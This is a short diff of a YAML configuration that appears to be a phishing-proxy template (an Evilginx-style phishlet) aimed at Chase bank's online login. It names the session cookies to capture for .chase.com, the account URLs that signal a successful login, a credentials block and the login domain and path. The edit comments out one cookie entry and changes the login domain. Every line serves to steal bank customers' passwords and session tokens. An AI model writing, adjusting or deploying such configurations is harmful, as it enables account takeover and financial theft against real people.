@@ -39,7 +39,7 @@ auth_tokens:
   - domain: '.chase.com'
     keys: ['session','_visit','id']
  # - domain: 'auth.chase.com'
-    keys: ['sid','ver,opt']
+ #   keys: ['sid','ver,opt']
 auth_urls:
   - '/myaccount/summary'
   - '/myaccount/.*'     
@@ -55,5 +55,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'chase.com'
+  domain: 'www.chase.com'
   path: '/secure/'
